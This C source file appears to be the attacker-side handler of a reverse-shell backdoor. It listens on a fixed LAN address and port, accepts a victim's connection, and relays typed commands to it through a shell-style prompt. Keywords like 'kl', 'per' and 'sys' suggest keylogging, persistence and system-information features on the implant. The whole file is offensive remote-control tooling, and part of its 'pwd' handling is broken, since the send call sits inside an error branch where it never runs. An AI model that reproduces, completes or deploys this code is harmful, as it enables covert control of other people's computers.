#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 4096


int main() {

    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i=0;
    int optval =1;
    socklen_t client_lenght;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error setting TCP socket options\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.47");  // our own node IP addr
    server_address.sin_port = htons(50001);

    bind(sock, (struct sockaddr*)&server_address, sizeof(server_address));
    listen(sock, 5);
    client_lenght = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr*)&client_address, &client_lenght);


    while(1)
    {
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if (strncmp("q", buffer, 1) == 0) {
            break;
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            goto jump;
        }
        else if (strcmp(buffer, "exit") == 0) {
            printf("Cliente desconectado desde %s:%d\n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
            break;
        }
        else if (strcmp(buffer, "pwd") == 0) {
            // Obtener el directorio actual del servidor
            char currentDir[MAX_RESPONSE_SIZE];
            if (getcwd(currentDir, sizeof(currentDir)) == NULL) {
                printf("Error al obtener el directorio actual del servidor\n");
                break;

            // Enviar la respuesta al cliente
            if (send(client_socket, currentDir, strlen(currentDir), 0) != strlen(currentDir)) {
                printf("Error al enviar la respuesta al cliente\n");
                break;
                }
            }
        }

        else if (strncmp("kl", buffer, 2) == 0 ) {
            goto jump;
        }
        else if (strncmp("per", buffer, 3) == 0 ) {
            recv(client_socket,response,sizeof(response),0);
            printf("%s", response);
        }
        else if (strncmp("sys", buffer, 3) == 0 ) {
            recv(client_socket,response,sizeof(response),0);
            printf("%s", response);
        }
        else if (strncmp("pwd", buffer, 3) == 0 ) {
            recv(client_socket,response,sizeof(response),0);
            printf("%s", response);
        }
        else if (strncmp("ls", buffer, 2) == 0 ) {
            recv(client_socket,response,sizeof(response),0);
            printf("%s", response);
        }
        else if (strncmp("help", buffer, 4) == 0 ) {
            recv(client_socket,response,sizeof(response),0);
            printf("%s", response);
        }
        else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }

}